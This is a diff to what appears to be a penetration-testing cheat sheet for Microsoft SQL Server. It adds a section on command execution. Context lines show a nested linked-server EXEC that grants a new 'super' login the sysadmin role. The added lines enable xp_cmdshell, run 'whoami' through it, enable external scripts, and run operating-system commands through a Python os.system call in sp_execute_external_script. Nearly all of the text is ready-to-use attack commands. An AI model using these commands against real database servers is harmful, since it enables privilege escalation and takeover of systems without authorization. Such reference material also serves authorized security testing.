@@ -36,3 +36,13 @@ If we are sa, then we add a user with sysadmin privileges for us
 
  - EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [NAME\DATABASE]') at [NAME\REMOTE DATABASE];
 
+### COMMAND EXECUTION WITH XP_CMDSHELL
+
+ - enable xp_cmdshell (Enable command execution)
+ 
+ - xp_cmdshell whoami
+
+ - EXECUTE sp_configure 'external scripts enabled', 1; (Enable execution of external scripts written in R or python)
+
+ - EXEC sp_execute_external_script @language = N'Python', @script = N'import os; os.system("COMMAND");'; (Run commands using Python)
+
